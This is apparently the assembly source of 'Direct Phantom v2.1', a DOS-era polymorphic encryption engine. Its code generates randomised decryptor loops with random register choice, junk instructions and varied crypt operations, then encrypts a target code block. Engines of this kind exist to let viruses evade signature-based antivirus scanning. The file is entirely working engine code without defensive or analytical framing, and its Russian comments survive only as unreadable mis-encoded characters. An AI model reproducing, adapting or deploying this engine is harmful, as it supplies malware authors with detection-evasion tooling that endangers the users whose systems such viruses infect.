   CntF        equ 00000001b   ; áç¥âç¨ª / ¯à¥¤¥«
   RMF     equ 00000010b   ; à¥£¨áâà / ¯ ¬ïâì
   UcF     equ 00000100b   ; ¥¨§¢¥áâ®¥ ¬¥áâ® ª®¤ 
   JRQ     equ 00001000b   ; ‡ ¯à®á   Jxx Imm8
   PRQ     equ 00010000b   ; ‡ ¯à®á   Push/Pop
   SRQ     equ 00100000b   ; ‡ ¯à®á   Subroutine
   CRQ     equ 01000000b   ; ‡ ¯à®á   CALL
   FCR     equ 10000000b   ; *¨â § ¢¥àè¥¨ï CALL'®¢
   MSR     equ 100000000b  ; *¨â § ¯à¥é¥¨ï SUB & CALL

   REG_AX      equ 0       ; *¥£¨áâàë ¯® ¯®àï¤ªã
   REG_CX      equ 1
   REG_DX      equ 2
   REG_BX      equ 3
   REG_SP      equ 4
   REG_BP      equ 5
   REG_SI      equ 6
   REG_DI      equ 7

   PhantomID   db  'Direct Phantom v2.1',0
   RND_SEED    db  55h
                        ; 7             0
   REG_USED    db  00010000b    ; DI SI BP SP BX DX CX AX
                        ; 7             0
   HALF_USED   db  00000000b    ; BH DH CH AH BL DL CL AL

   PH_FLAGS    db  0      ; ä« £¨
           db  0      ; * áè¨à¥ë¥ ä« £¨

   BASE_REG    db  0      ; ¡ §®¢ë© à¥£¨áâà
   KEY_REG     db  0      ; ª«îç
   BASE_RM     db  0      ;  ¤à¥á æ¨ï ç¥à¥§ ¡ §ã ¢ ¯ ¬ïâì
   BASE_TR     dw  0      ; ¡ §  - init
   EncryptPart dw  0      ;  ¤à¥á EP ¢ áâ¥ª¥

   INITTAB     dw  offset INITBASEOFFS   ; ’ ¡«¨æ  ¨¨æ¨ «¨§ æ¨¨
           dw  offset INITBASESEG
           dw  offset INITKEY
           dw  offset INITCOUNTER
           dw  offset INITBASESEG
   INITFLAGS   db  0
   ;-----------------------------------------
   ImmF        equ 10000000b
   KeyF        equ 01000000b

           ; COP , ModeR/M , Flags & ‡¥àª «ì ï ª®¬ ¤ 

   CRYPTTAB    db  11000000b,11000000b,ImmF+3   ; ROL REG/MEM,IMM8
           db  11000000b,11001000b,ImmF+0   ; ROR REG/MEM,IMM8
           db  10000000b,11000000b,ImmF+9   ; ADD REG/MEM,imm8
           db  10000000b,11101000b,ImmF+6   ; SUB REG/MEM,imm8
           db  10000000b,11110000b,ImmF+12  ; XOR reg/mem,imm8

           db  11110110b,11010000b,15       ; NOT reg/mem
           db  11110110b,11011000b,18       ; NEG reg/mem
           db  11111110b,11000000b,24       ; INC reg/mem
           db  11111110b,11001000b,21       ; DEC reg/mem
           db  11010000b,11000000b,30       ; ROL REG/MEM,1
           db  11010000b,11001000b,27       ; ROR REG/MEM,1

           db  00000000b,11000000b,KeyF+36  ; ADD reg/mem,KEY
           db  00101000b,11000000b,KeyF+33  ; SUB reg/mem,KEY
           db  00110000b,11000000b,KeyF+39  ; XOR reg/mem,KEY
   ENDCRCMD    equ $

   ;-----------------------------------------------------------------------------
   RND     proc
   ; dl = RND(0..dl)  ¯®«ãç¨âì á«ãç ©ë© ¡ ©â

           push    ax
           or  dl,dl            ; RND(0..0)=0
           jz  FinishRND
           push    dx

           inc dl
           jnz NormLimit
           dec dl
   NormLimit:
           mov ax,0100h        ; à §¬¥à ¥¤¨¨ç®£® ®âà¥§ª 
           div dl
           not ah
           push    ax

           in  al,40h       ; RND ¡ ©â
           mul [RND_SEED]
           add ax,13849
           mov [RND_SEED],al

           pop dx      ; *¨¥ªâ¨¢® ®â®¡à §¨¬ RND ¡ ©â ¢ ¯à¥¤¥«ë
           cmp al,dh
           jbe NormByte
           mov al,dh
   NormByte:
           xor ah,ah
           div dl
           pop dx
           mov dl,al
   FinishRND:
           pop ax
           ret
   RND     endp
   ;-------------------
   DROPCOIN    proc
   ; ¯®¤¡à áë¢ ¨¥ ¬®¥âª¨ - à¥§ã«ìâ â ¢ ZF
           push    dx
           mov dl,1
           call    RND
           and dl,1
           pop dx
           ret
   DROPCOIN    endp
   ;-------------------
   GETNUM      proc
   ; Exit - RND = 0...dl , al = mask
           call    RND
           mov cl,dl
           mov al,1
           shl al,cl
           ret
   GETNUM      endp
   ;-------------------
   GETFREEREG  proc
   ; CF=0 - à¥£¨áâà
   ; CF=1 - ¯®«ãà¥£¨áâà
   ; ‚®§¢à é ¥â á¢®¡®¤ë© à¥£¨áâà ¢ DL
           pushf
           push    ax
           push    cx
           jc  HalfReg
   NextReg:
           mov dl,7
           call    GETNUM
           test    [REG_USED],al
           jnz NextReg

           or  [REG_USED],al    ; *®¬¥â¨¬ ª ª § ïâë©

           mov cl,al        ; ¡¨âë 3...0 ¢ 7...0
           shl cl,4         ; ¤«ï HALF_USED
           and al,0Fh
           or  al,cl
           or  [HALF_USED],al   ; *®¬¥â¨¬

           jmp RegDone
   HalfReg:
           mov dl,7
           call    GETNUM
           test    [HALF_USED],al
           jnz HalfReg

           or  [HALF_USED],al  ; *®¬¥â¨¬ ª ª § ïâë©
           cmp al,0Fh
           jb  DontRotate
           shr al,4        ; *®¬¥â¨¬ ª ª § ïâë© ¨ ¢ REG_USED
   DontRotate:
           or  [REG_USED],al
   RegDone:    pop cx
           pop ax
           popf
           ret
   GETFREEREG  endp
   ;-------------------
   FREEREG     proc
   ; Ž¡ì¢«ï¥â à¥£¨áâà á¢®¡®¤ë¬
           push    ax
           pushf
           mov al,1
           mov cl,dl
           shl al,cl

           mov cl,al
           not cl

           mov ah,al          ; ¡¨âë 3...0 ¢ 7...0
           shl ah,4           ; ¤«ï HALF_USED
           and al,0Fh
           or  ah,al

           popf
           jc  FreeHalfReg

           not ah         ; Žá¢®¡®¦¤ ¥¬ à¥£¨áâà ¨
           and [REG_USED],cl      ; ¤¢  á®®â¢¥âáâ¢ãîé¨å ¯®«ãà¥£¨áâà 
           and [HALF_USED],ah
           jmp EndFreeReg
   FreeHalfReg:
           and [HALF_USED],cl     ; …á«¨ ¢â®à®© ¯®«ãà¥£¨áâà á¢®¡®¤¥
           and ah,[HALF_USED]     ; â® ®á¢®¡®¦¤ ¥¬ à¥£¨áâà
           jnz EndFreeReg
           not al
           and [REG_USED],al
   EndFreeReg:
           pop ax
           ret
   FREEREG     endp
   ;-------------------
   MAKERM      proc
   ; ˆáå®¤ï ¨§ ¨¤¥ªá®£® à¥£¨áâà  ¢ DL ¤¥« ¥â
   ; á®®â¢¥âáâ¢ãîéãî  ¤à¥á æ¨î ¢¯ ¬ïâì
           push    ax
           mov al,00011011b
           cmp dl,REG_BX    ; BX
           jz  RM
           shr al,2
           cmp dl,REG_BP    ; BP
           jz  RM
           shr al,2
           cmp dl,REG_DI    ; DI
           jz  RM

           shr al,2         ; SI
   RM:     and al,00000011b
           or  al,00000100b     ; DONE
           mov [BASE_RM],al
           pop ax
           ret
   MAKERM      endp
   ;-------------------
   SavePRFX    proc

           cmp [BASE_REG],REG_BP    ; *à¥ä¨ªá â®«ìª® ¯¥à¥¤ [BP]
           jne PRFX_OUT

           push    cx
           in  al,40h
           mov cl,al

           mov al,00100110b
   RNDPRFX:    xor al,00011000b   ; ES ¨«¨ DS
           loop    RNDPRFX

           stosb              ; DONE
           pop cx
   PRFX_OUT:
           ret
   SavePRFX    endp
   ;-------------------
   INITBASEOFFS    proc
   ; ¡ §¨àã¥â à¥£¨áâà   ªà¨¯âã¥¬ë© ª®¤
   ; ¢®§¬®¦® ¥¨§¢¥áâ®¥ á¬¥é¥¨¥ - ª®¤ áà §ã §  ¤¥ªà¨¯â®à®¬

   GetBase:
           clc
           call    GETFREEREG    ; ¯®«ãç¨«¨ ¡ §ã

           mov al,1
           mov cl,dl
           shl al,cl
           and al,11101000b ;¬ áª  ¨¤¥ªáëå à¥£¨áâà®¢ : SI,DI,BP,BX
           jnz BASEOK

           clc          ;â®«ìª® ¨¤¥ªáë¥
           call    FREEREG
           jmp GetBase
   BASEOK:
           mov [BASE_REG],dl     ; § ¯®¬¨¬
           call    MAKERM        ; á¤¥« ¥¬ r/m ¡ ©â

           mov al,10111000b      ; mov reg,imm16
           or  al,dl
           stosb

           mov dx,[DEST_CODE]  ; ‘¬¥é¥¨¥ ªà¨¯âã¥¬®£® ª®¤ 
           test    [PH_FLAGS],UcF  ; ¥é¥ ¨§¢¥áâ® - ¤®¤¥« ¥¬ ¯®â®¬
           jz  make_base   ; DESTCODE ¡ã¤¥â áà §ã §  ¤¥ªà¨¯â®à®¬

           xor dx,dx       ; ¯®ª  ¡ §  0
           mov word ptr [PHTEMP_BASE],di
   make_base:
           in  al,40h   ; ‘«®¢®¥ ¤®¯®«¨â¥«ì®¥ TRASH á¬¥é¥¨¥
           mov ah,al
           in  al,40h

           xchg    ax,dx    ; INITBASE = BASE - TRASH
           sub ax,dx
           mov [BASE_TR],dx
           stosw
           call    TRCHAIN
           ret
   INITBASEOFFS    endp
   ;-------------------
   INITBASESEG proc
   ; “áâ ®¢¨¬ ES,DS = CS
           mov dh,00011000b       ; ES ¨«¨ DS
   DEST_SREG   equ $ - 1

           mov dl,00001000b       ; CS
           call    MAKESEGREG
           xor byte ptr [DEST_SREG],00011000b

           ret
   INITBASESEG endp
   ;-------------------
   MAKESEGREG  proc
   ; dh - destination sreg      Œ®¤¥«¨àã¥âáï : PUHS SRC  ¨«¨  MOV REG,SRC
   ; dl - source sreg              POP DEST       MOV DEST,REG

           call    DROPCOIN    ; ¯®¤¡à®á¨¬ ¬®¥âªã
           jz  SECONDPART

           mov al,00000110b      ; PUSH SREG
           or  al,dl         ; + SOURCE
           stosb

           call    TRCHAIN

           xor al,dl         ; á¡à®á¨¬ SOURCE
           or  al,1          ; + POP
           or  al,dh         ; + DESTINATION
           stosb
           jmp DoneSreg
   SECONDPART:
           mov ax,1100000010001100B      ; MOV REG,SREG
           or  ah,dl
           clc
           mov cl,dl
           call    GETFREEREG
           xchg    cl,dl
           or  ah,cl         ; ¯à®¬¥¦ãâ®çë© à¥£¨áâà
           stosw

   ; *¥«ì§ï ¤¥« âì CALL ¬ãá®à, â ª ª ª ¢ë§¢  ï ¨¦¥ ¯à®æ¥¤ãà  ¬®¦¥â
   ; ¯®àâ¨âì ã¦¥ ®á¢®¡®¦¤¥ë© §¤¥áì ¯à®¬¥¦ãâ®çë© à¥£¨áâà

           or  word ptr [PH_FLAGS],MSR
           call    TRCHAIN
           xor word ptr [PH_FLAGS],MSR

           xor ah,dl         ; á¡à®á¨¬ SOURCE
           or  al,2          ; Set Dbit - MOV SREG,AX
           or  ah,dh         ; + DESTINATION
           or  ah,cl         ; + ¯à®¬¥¦ãâ®çë© à¥£¨áâà
           stosw

           mov dl,cl         ; á¢®¡®¤¥ ¤«ï ¤ «ì¥©è¥£®
           clc
           call    FREEREG
   DoneSreg:
           call    TRCHAIN
           ret
   MAKESEGREG  endp
   ;-------------------
   INITKEY     proc
           in  al,40h      ; ª«îç
           mov ah,al
           mov al,10110000b    ; MOV REG,IMM8
           stc
           call    GETFREEREG  ; á ¬ à¥£¨áâà
           mov [KEY_REG],dl    ; ®  ¬ ¥é¥ ¡ã¤¥â ã¦¥
           or  al,dl
           stosw
           call    TRCHAIN
           ret
   INITKEY     endp
   ;-------------------
   INITCOUNTER proc
           call    DROPCOIN    ; ®£à ¨ç¨¢ ¨¥ ªà¨¯âã¥¬®£® ª®¤  -
           jz  CodeLimit   ; áà ¢¨¢ ¨¥ á ¯à¥¤¥«®¬

           clc         ; á¤¥« ¥¬ áç¥âç¨ª
           call    GETFREEREG
           mov byte ptr [CNT_REG],dl
           mov al,10111000b
           or  al,dl
           stosb

           mov ax,[counter]
           stosw
           or  [PH_FLAGS],CntF    ; ®£à ¨ç¨¢ ¨¥ ¯® áç¥âç¨ªã
           call    TRCHAIN        ; DEC CNT
   CodeLimit:
           xor [PH_FLAGS],CntF    ; ®£à ¨ç¨¢ ¨¥ ¯® ¯à¥¤¥«ã
           ret            ; CMP BASE,DESTCODE+COUNTER
   INITCOUNTER endp
   ;-------------------
   INITPHANTOM proc
   ;ˆ¨æ¨ «¨§ æ¨ï ¢á¥å ¯ à ¬¥âà®¢ ¢ ¯à®¨§¢®«ì®¬ ¯®àï¤ª¥

           call    DROPCOIN      ;ªà¨¯â®¢ ¨¥ REG/MEM ?
           jz  CRYPTTYPE

           or  [PH_FLAGS],RMF    ; ªà¨¯â®¢ ¨¥ ¥¯®áà¥¤áâ¢¥®
                         ; ¢ ¯ ¬ïâì
   CRYPTTYPE:
           cmp [DEST_CODE],0FFFFh   ; DEST_CODE ¥¨§¢¥áâ®
           jne fixed            ; ¡ã¤¥â áà §ã §  ¤¥ªà¨¯â®à®¬

           or  [PH_FLAGS],UcF       ; ãáâ ®¢¨¬ Unknown Code Flag
   fixed:

   ; *®á«¥¤®¢ â¥«ìë© RND ¢ë§®¢ ¯à®æ¥¤ãà  áâà®©ª¨ ¯ à ¬¥âà®¢

           mov dl,4
   NextProc:
           push    dx
           call    GETNUM
           shl dl,1
           movzx   bx,dl    ; index ¢ â ¡«¨æ¥  ¤à¥á®¢ ¯à®æ¥¤ãà

           test    [INITFLAGS],al
           jnz ThisProcIsDone    ; “¦¥ ¡ë«  ¢ë¯®«¥ 

           or  [INITFLAGS],al        ; *®¬¥â¨¬
           call    [BX+offset INITTAB]   ; ‚ë¯®«¨¬
           pop dx
           jmp NextProc
   ThisProcIsDone:
           cmp [INITFLAGS],1Fh   ; ¢á¥ ¯à®æ¥¤ãàë ¢ë¯®«¥ë ?
           pop dx
           jne NextProc
           ret
   INITPHANTOM endp
   ;-------------------
   ENCRYPT     proc
   ; ƒ¥¥à¨àã¥â ª®¬ ¤ë § £àã§ª¨/á®åà ¥¨ï ¡ ©â  ¨§ ªà¨¯âã¥¬®£® ª®¤ ,¥á«¨ RmF=0
   ; ƒ¥¥à¨àã¥â ¯®á«¥¤®¢ â¥«ì®áâì à áè¨äà®¢ë¢ îé¨å ª®¬ ¤ - DecryptPart ,
   ; ¯ à ««¥«ì® ¢ áâ¥ª¥ £¥¥à¨âáï §¥àª «ì ï ¯®á«¥¤®¢ â¥«ì®áâì - EncryptPart
   ; ¤«ï ¯®á«¥¤ãîé¥© § è¨äà®¢ª¨ ª®¤ 

           pop word ptr [CryptExit]

           mov word ptr [PH_LABEL],di   ; ¬¥âª  ¤«  ¯¥à¥å®¤ 
           call    TRCHAIN          ; à §¡ ¢¨¬ ¤¥àì¬®¬

           test    [PH_FLAGS],RMF  ; ¥  ¤® § £àã§ª¨ ¡ ©â  ¢ TMP_REG
           jnz MEMCRYPT

   ; Œ®¤¥«¨àã¥¬ ‡ £àã§ªã ¡ ©â  ¨§ ª®¤ 
           stc
           call    GETFREEREG
           mov byte ptr [TMP_REG],dl

           call    SavePRFX         ; …á«¨ ã¦® á¤¥« ¥¬ ¯à¥ä¨ªá

                            ; ¤«ï ª®¬ ¤ë á®åà ¥¨ï ¡ ©â 

           mov word ptr [LoadSaveCMD],di


           mov al,10001010b       ; MOV REG,R/M
           stosb

           mov al,10000000b       ; ¡ ©â ModeR/M

           shl dl,3           ; + TMP_REG
           or  al,dl          ; +  ¤à¥á æ¨î ¢ ¯ ¬ïâì
           or  al,[BASE_RM]
           stosb

           mov ax,[BASE_TR] ; + ¬ãá®à - REALBASE = INIT + TRASH
           stosw
           call    TRCHAIN
   MEMCRYPT:
   ; ƒ¥¥à¨¬ EN/DEcryptionPart
           mov word ptr [CRYPTLAB],di
           ; ‚ [CRYPTLAB] ¡ã¤¥â ¯®¬¥é¥ JMP ¢ DecryptPart

           call    RMTRASH
           call    SimplyTRASH ; *®¢¥àìâ¥ â ª  ¤®...
           call    RMTRASH

           mov si,offset CRYPTTAB

           mov dl,8      ; ªà¨¯âãîé¨å ª®¬ ¤ : RND (8...16)
           call    RND
           add dl,8
           mov cl,dl
           xor ch,ch
                           ; STKFRM - à §¬¥à DecPart ¢ áâ¥ª¥
           mov word ptr [STKFRM],6 ; *®ª  â®«ìª® ¤ «ì¨© JMP

           push    es  ; Seg:Offs Decryptor'a
           push    ax
           mov word ptr [OffsFARJump],sp  ; „«ï á¬¥é¥¨ï - ®®
                              ; ¥é¥ ¥ ¨§¢¥áâ®

           mov ax,0EA90h     ; Far Jump ®¡à â® ¢ ¤¥ªà¨¯â®à
           push    ax

   MAKE_CRYPT_CMD:

           mov dl,(ENDCRCMD-CRYPTTAB)/3-1
           call    RND
           xchg    al,dl
           mov dl,3         ; ¨¤¥ªá ª®¬ ¤ë ¢ â ¡«¨æ¥
           mul dl
           mov bx,ax

           mov ax,9090h     ; Stack Frame for THIS command
           push    ax
           push    ax
           push    ax
           add word ptr [STKFRM],6  ; ã¢¥«¨ç¨¬
           mov bp,sp

           test    [PH_FLAGS],RMF  ; *ã¦¥ ¯à¥ä¨ªá ? (¥á«¨ ¢ ¯ ¬ïâì)
           jz  DoNotPRFX
           call    SAVEPRFX
           mov byte ptr [bp],26h     ; ˆ ¢ stack frame
           inc bp
   DoNotPRFX:
           mov ax,[si+bx]
           stosb           ; ŠŽ*
           mov al,ah       ; ModeR/M ¡ ©â

           mov ah,bl
           mov bl,[si+bx+2]
           and bl,00111111b
           mov dx,[si+bx]  ; ª®¤ §¥àª «ì®© ª®¬ ¤ë
           mov bl,ah

           mov [bp],dl
           inc bp

           test    byte ptr [si+bx+2],KeyF ; ¥ ¤®¡ ¢«ïâì ª«îç
           jz  DontAddKEY

           mov dl,[KEY_REG]    ; + KEY_REG
           shl dl,3
           or  al,dl       ; This COP
           or  dh,dl       ; COP ¢ stack frame
   DontAddKEY:
   ; ¤®¡a¢«¥¨¥ ¯ ¬ïâ¨ ¨«¨ TMP_REG'a

           mov ah,00h
   TMP_REG     equ $ - 1
           test    [PH_FLAGS],RMF
           pushf
           jz  AddTMP

           mov ah,[BASE_RM]
           and al,10111111b   ; MODE = [mem+imm16]
           and dh,10111111b
   AddTMP:
           or  al,ah          ; COP's Done
           or  dh,ah
           stosb
           mov [bp],dh
           inc bp

           popf
           jz  AddIMM8

           mov ax,[BASE_TR]   ; + ¬ãá®à (ª ª ¯à¨ § £àã§ª¥ ¡ ©â )
           stosw
           mov   [bp],ax
           inc   bp
           inc   bp
   AddIMM8:
           test    byte ptr [si+bx+2],ImmF
           jz  CRCMD_DONE         ; Immediate8  ¥  ¤®

           in  al,40h
           stosb
           mov [bp],al   ; B stack frame

   CRCMD_DONE:
           call    TRCHAIN     ; ‘«¥¤ãîéãî ª®¬ ¤ã
           dec cx
           jne MAKE_CRYPT_CMD

           mov bp,0000h   ; ¢ëå®¤ ¨§ stackframe ¢ DECRYPTOR
   OffsFARJump equ $ - 2
           mov [bp],di

           mov [EncryptPart],sp

           test    [PH_FLAGS],RMF
           jnz DontMakeSaveCMD

           call    SAVEPRFX      ; ‘¤¥« ¥¬ ª®¬ ¤ã á®åà ¥¨ï ¡ ©â  -
           mov bx,0000h      ; ¢®§ì¬¥¬ ª®¬ ¤ã § £àã§ª¨ ¨
   LoadSaveCMD equ $ - 2         ; á¡à®á¨¬ Direction bit
           mov eax,es:[bx]
           and al,11111101b

           stosd             ; Done

           call    TRCHAIN
   DontMakeSaveCMD:
           mov ax,0000h
   CryptExit   equ $ - 2

           push    ax
           ret
   ENCRYPT     endp
   ;-------------------
   CHANGECNT   proc

           call    DROPCOIN
           jz  second

           mov al,01000000b
           or  al,[BASE_REG]
           stosb
           jmp ChangeEndCrypt
   second:
           mov ax,1100000010000011b    ; ADD/SUB BASE,imm8
           or  ah,[BASE_REG]

           call    DROPCOIN
           jz  met

           xor byte ptr [IncDec],00001000b
           or  ah,00101000b
   met:
           stosw
           push    ax
           in  al,40h
           and al,3Fh
           mov dl,al
           stosb
           pop ax

           call    TRCHAIN

           dec dl
   IncDec      equ $ - 1
           xor ah,00101000b
           stosw
           mov al,dl
           stosb

           or  byte ptr [IncDec],00001000b
   ChangeEndCrypt:
           call    TRCHAIN

           test    [PH_FLAGS],CntF
           jnz Limit_

           mov al,01001000b
           or  al,00h
   CNT_REG     equ $ - 1
           stosb
           jmp   endchange
   Limit_:
           mov ax,1111100010000001b
           or  ah,[BASE_REG]
           stosw
           mov ax,[DEST_CODE]
           inc ax
           test    [PH_FLAGS],UcF
           jnz unk
           dec ax
   unk:
           sub ax,[BASE_TR]
           mov word ptr [PHTEMP_CNT],di
           add ax,[COUNTER]
           stosw
   endchange:
           ret
   CHANGECNT   endp
   ;-------------------
   MAKEJNE     proc

           mov dx,di
           inc dx
           inc dx
           sub dx,1234h
   PH_LABEL    equ $ - 2
           cmp dx,80h      ; *¥ ¢ëå®¤¨â «¨ §  ¯à¥¤¥«ë 128 ¡ ©â
           jb  REL8bit
           inc dx
           inc dx
           mov ax,850Fh    ; JNE Rel16
           stosw
           xchg    ax,dx       ; ¨ á¬¥é¥¨¥
           neg ax
           stosw
           jmp EndJNE
   REL8bit:
           mov al,75h      ; á¤¥« ¥¬ ª®à®âª¨©
           stosb
           xchg    al,dl
           neg al
           stosb
   EndJNE:
           ret
   MAKEJNE     endp
   ;-----------------------------------------------------------------------------
   PHANTOM     proc

   ; ‘âàãªâãà  § ¯®«ï¥¬ ï ¤«ï ¢ë§®¢  PHANTOM
   ;    RELOFFS      - TARGETOFFS + RELOFFS = à¥ «ì®¥ ¬¥áâ® ¢ë¯®«¥¨ï
   ;    DEST_CODE    -  ¤à¥á ªà¨¯âã¥¬®£® ª®¤ 
   ;    COUNTER      - ¤«¨  ª®¤ 
   ;    TARGETPLACE      - ¬¥áâ® ¤«ï ¤¥ªà¨¯â®à 
   ;    LENDECRYPTOR     - ¤«¨  ¤¥ªà¨¯â®à  (£¥¥à¨âáï)

   ; ˆ¨æ¨ «¨§ æ¨ï
           pop word ptr [EXPHANTOM]
           cli

           xor al,al
           mov [PH_FLAGS],al
           mov [INITFLAGS],al
           mov [HALF_USED],al
           mov [REG_USED],00010000b

           movzx   eax,al
           mov dword ptr [SUBOFFS],eax
           mov dword ptr [SUBOFFS+4],eax

           les di,[TARGETPLACE]    ; Šã¤  ¡ã¤¥¬ £¥¥à¨âì
           cld

           call    TRCHAIN

           call    INITPHANTOM ; Part 1 - ¨¨æ¨ «¨§ æ¨ï à¥£¨áâà®¢
           call    ENCRYPT     ; Part 2 - GEN EN/DEcryptionPart
           call    CHANGECNT   ; Part 3 - ¨§¬¥¥¨¥ áç¥âç¨ª®¢
           call    MAKEJNE     ; Part 4 - æ¨ª«¨ç¥áª¨© ¯¥à¥å®¤

           mov word ptr [ENDLOOP],di
           ; „«ï § è¨äà®¢ë¢ ¨ï ¨á¯®«ì§ã¥âáï â®â ¦¥ ¤¥ªà¨¯â®à -
           ; DI -  ¤à¥á ¤«ï ¢à¥¬¥®£® RETF

           call    TRCHAIN
           call    FinishTR

           test    [PH_FLAGS],UcF
           jz  DONTADDOFFS
           mov [DEST_CODE],di      ; ¤¥« ¥¬ Relative DEST_CODE
           call    ADDREALPLACE
   DONTADDOFFS:
           mov ax,di
           sub ax,word ptr [TARGETPLACE]
           mov [LENDECRYPTOR],ax   ; „«¨  ¤¥ªà¨¯â®à 

           sti
           mov ax,0000h
   EXPHANTOM   equ $ - 2
           push    ax
           ret
   PHANTOM     endp
   ;-------------------
   JuNK_DOIT   proc
   ; ‡ è¨äà®¢ª  ª®¤  ¨ ã¤ «¥¨¥ EncryptionPart
           cli
           pop word ptr [EXJUNK]

           push    es
           pop ds

           mov si,0000h   ; ‘¤¥« ¥¬ ¢à¥¬¥ë© ¢®§¢à â
   ENDLOOP     equ $ - 2
           mov dh,0CBh
           xchg    [si],dh

           mov bx,0000h
   CRYPTLAB    equ $ - 2
                      ; ‘¤¥« ¥¬ jmp SS:EncryptChain
           mov dl,0EAh
           mov ax,ss      ; ‘¥£¬¥â áâ¥ª 
           rol eax,16
           mov ax,cs:[EncryptPart]   ; ‘¬¥é¥¨¥

           xchg    [bx],dl
           xchg    [bx+1],eax

           push    si
           push    bx
           push    dx
           push    eax

           call    cs:[TARGETPLACE]

           pop eax
           pop dx
           pop bx
           pop si

           mov [si],dh      ; ¢®ááâ ®¢¨¬ ¢á¥ çâ® ¯®¬¥ï«¨
           mov [bx],dl
           mov [bx+1],eax

           push    cs
           pop ds

           mov di,[RELOFFS]   ; ‘¤¥« ¥¬ *¥ «ì®¥ á¬¥é¥¨¥
           call    ADDREALPLACE

           push    ss
           push    ss
           pop es
           pop ds

           mov dx,0000h
   StkFrm      equ $ - 2

           mov di,sp
           mov si,sp
           mov cx,cs:[EncryptPart]

           cld
           add di,dx
           sub cx,sp
   Move:
           jcxz    EndMoveStk
           movsb
           dec cx
           jmp Move
   EndMoveStk:
           add sp,dx

           push    cs
           push    cs
           pop es
           pop ds

           sti
           mov ax,0000h
   EXJUNK      equ $ - 2
           push    ax
           ret
   JuNK_DOIT   endp
   ;-------------------
   AddRealPLACE    proc
           mov bx,1234h
   PHTEMP_BASE equ $ - 2
           add es:[bx],di

           test    [PH_FLAGS],CntF
           jz  DontLimit

           mov bx,1234h
   PHTEMP_CNT  equ $ - 2
           add es:[bx],di
   DontLimit:
           ret
   AddRealPLACE    endp
